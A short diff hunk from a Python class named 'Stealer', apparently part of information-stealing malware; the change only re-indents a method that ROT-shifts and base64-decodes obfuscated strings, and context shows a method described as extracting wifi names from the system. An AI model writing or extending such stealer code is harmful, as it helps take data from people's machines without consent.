@@ -81,8 +81,8 @@ class Stealer:
         return rot_string
 
     def parse(self, string: str, shift: int):
-      # rot and decode
-      return base64.b64decode(self.rot(string, shift=shift)).decode()
+        # rot and decode
+        return base64.b64decode(self.rot(string, shift=shift)).decode()
 
     def get_wifi_names(self):
         # extract wifi names from the system
